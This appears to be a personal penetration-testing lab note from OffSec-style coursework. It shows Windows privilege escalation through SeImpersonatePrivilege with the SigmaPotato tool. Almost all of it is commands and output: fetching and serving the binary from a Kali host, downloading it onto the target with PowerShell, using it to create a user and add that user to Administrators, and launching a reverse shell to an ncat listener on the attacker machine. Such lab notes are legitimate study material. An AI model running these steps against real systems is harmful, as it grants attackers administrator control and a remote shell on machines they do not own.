https://github.com/tylerdotrar/SigmaPotato?tab=readme-ov-file

It is located in my kali binaries folder
SigmaPotato.exe

# Creating an user and add it to admin group
Once identified:
SeImpersonatePrivilege is enabled -->Impersonate a client after authentication 

```
C:\Users\dave> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

download the 64-bit version of this tool, and serve it with a Python3 web server.
```
kali@kali:~$ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
...
2024-09-03 12:50:48 (1.26 MB/s) - 'SigmaPotato.exe' saved [63488/63488]

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
    Listing 84 - Downloading PrintSpoofer64.exe and serve it with a Python3 web server

Downloading SigmaPotato.exe to CLIENTWK220
```
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
```

Using the SigmaPotato tool to get add a new user to the Administrators localgroup.
```
C:\Users\dave> .\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net user dave4 lab /add"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
...
[+] Process Started with PID: 2004

[+] Process Output:
The command completed successfully.

PS C:\Users\dave> net user
net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave                     
dave4                    daveadmin                DefaultAccount           
Guest                    offsec                   steve                    
WDAGUtilityAccount       
The command completed successfully.

PS C:\Users\dave> .\SigmaPotato "net localgroup Administrators dave4 /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
...
[+] Process Started with PID: 10872

[+] Process Output:
The command completed successfully.


PS C:\Users\dave> net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave4
daveadmin
offsec
The command completed successfully.
```


# Creating a reverse shell
Listen in kali
```
┌──(kali㉿kali)-[~/binaries]
└─$ rlwrap ncat -nvlp 443
```

Execute in target
```
C:\Users\dave> .\SigmaPotato --revshell 192.168.48.3 443
```





